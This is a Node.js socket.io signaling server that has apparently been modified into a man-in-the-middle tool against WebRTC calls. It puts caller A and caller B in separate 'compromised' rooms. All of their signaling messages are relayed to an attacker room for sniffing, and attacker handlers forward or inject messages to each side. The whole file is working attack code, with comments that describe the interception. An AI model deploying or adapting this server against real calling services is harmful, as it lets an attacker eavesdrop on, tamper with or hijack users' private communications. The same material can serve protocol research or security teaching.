'use strict';

var os = require('os');
var nodeStatic = require('node-static');
var http = require('http');
var socketIO = require('socket.io');

var compromisedroom1 = "bad1";//compromised room for caller A
var compromisedroom2 = "bad2";//compromised room for caller B
var numClients = 0;

var fileServer = new(nodeStatic.Server)();
var app = http.createServer(function(req, res) {
  fileServer.serve(req, res);
}).listen(8080);

var io = socketIO.listen(app);
io.set('origins', '*:*');//allows CORS request
io.sockets.on('connection', function(socket) {

  // convenience function to log server messages on the client
  function log() {
    var array = ['Message from server:'];
    array.push.apply(array, arguments);
    socket.emit('log', array);
  }

  /**
   *Filters all communication from A/B through attacker
   */  
  socket.on('message', function(message, room) {
    socket.to("mitm").emit('sniff', message, room);
  });


  /**
   *Attacker function to send messages to A 
   */  
  socket.on('forward_ToA', function(message, room) {
    log('Message forwarded to A: ', message);
    try{
      socket.to('bad1').emit('message', message);
    }catch(e){
      log(e);//debug for when 2nd room not yet open
    }
  });

  /**
   *Attacker function to send messages to B
   */  
  socket.on('forward_ToB', function(message, room) {
    log('Message forwarded to B: ', message);
    try{
      socket.to('bad2').emit('message', message);
    }catch(e){
      log(e);//debug for when 2nd room not yet open
    }
  });

  /**
   * Handles room creation. Attacker is put in a "mitm" room and A and B are put into
   * separate rooms (so communication can be controlled by attacker)
   * 
   * When A joins a room (bad1) which occurs when numclients%2 == 1
   *    -A 'created' message is sent to room A so call preparation begins
   * 
   * When B joins a room (bad2) which occurs when numclients%2 == 0
   *  -We send a "join" message to A to set isChannelReady to true
   *  -We send a 'joined" message to B to set isChannelReady to true
   */
  socket.on('create or join', function(room) {
    //MiTM
    if(room === "mitm"){
      socket.join(room);
      socket.emit("set attacker");
    }else{
    
    log('Received request to create or join room ' + room);
    log('Room ' + room + ' now has ' + numClients + ' client(s)');
    var room1status = io.sockets.adapter.rooms[compromisedroom1];
    var room2status = io.sockets.adapter.rooms[compromisedroom2]; 

    if (!room1status) {
      room = compromisedroom1;
      socket.join(room);
      log('Client ID ' + socket.id + ' created room ' + compromisedroom1);
      socket.emit('created', room, socket.id);
      numClients++;

    } else if (!room2status) {
      room = compromisedroom2;
      log('Client ID ' + socket.id + ' joined room ' + compromisedroom2);
      io.sockets.in(compromisedroom1).emit('join', compromisedroom1);//I think we need to signal to first room to kick off process
      socket.join(compromisedroom2);
      socket.emit('joined', compromisedroom2, socket.id);
      io.sockets.in(room).emit('ready');
      numClients++;
    } else { // This statement is no longer reached as we no longer limit rooms to 2
      socket.emit('full', room);
      log('room1  and room2 sizes:', room1status, room2status);    
    }
  }});

  //legacy function
  socket.on('ipaddr', function() {
    var ifaces = os.networkInterfaces();
    for (var dev in ifaces) {
      ifaces[dev].forEach(function(details) {
        if (details.family === 'IPv4' && details.address !== '127.0.0.1') {
          socket.emit('ipaddr', details.address);
        }
      });
    }
  });

  socket.on('bye', function(){
    console.log('received bye');
    numClients--;
  });

});
